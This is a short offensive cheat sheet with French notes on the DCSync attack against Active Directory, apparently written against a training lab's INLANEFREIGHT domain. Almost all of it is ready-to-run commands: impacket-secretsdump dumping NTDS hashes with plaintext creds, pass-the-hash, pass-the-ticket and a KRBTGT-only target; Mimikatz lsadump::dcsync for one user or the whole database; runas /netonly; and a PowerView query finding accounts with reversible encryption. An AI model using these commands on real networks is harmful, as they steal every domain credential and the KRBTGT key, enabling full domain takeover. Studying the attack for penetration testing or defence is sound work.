
> [!TIP]
> Se fait passer pour un contrôleur de domaine et demande au DC de répliquer la base NTDS
> Possible d'obtenir des identifiants en clair si le paramètre 'Reversible Encryption' est appliqué à l'utilisateur


# LINUX

## *Impacket*

avec creds en clair

```shell
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc -user-status -history -pwd-last-set INLANEFREIGHT/adunn@172.16.5.5
```

Pass the hash

```shell
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc -user-status -history -pwd-last-set INLANEFREIGHT/adunn@172.16.5.5 -hashes ':NTHASH'
```

Pass the ticket

```shell
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc -user-status -history -pwd-last-set -k -no-pass dc.target.local
```


target KRBTGT account

```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc-user inlanefreight/krbtgt -user-status -history -pwd-last-set INLANEFREIGHT.LOCAL/solarwindsmonitor@172.16.5.5
```



# WINDOWS

Se mettre dans le contexte de la session utilisateur.

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

## Mimikatz

### DCSync

```powershell-session
.\mimikatz.exe
```

```powershell-session
privilege::debug
```

Target un user

```powershell-session
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

Dump toute la base

```powershell-session
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv
```


## PowerView

Check si un user a bien l'option Reversible Encryption activée

```powershell-session
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
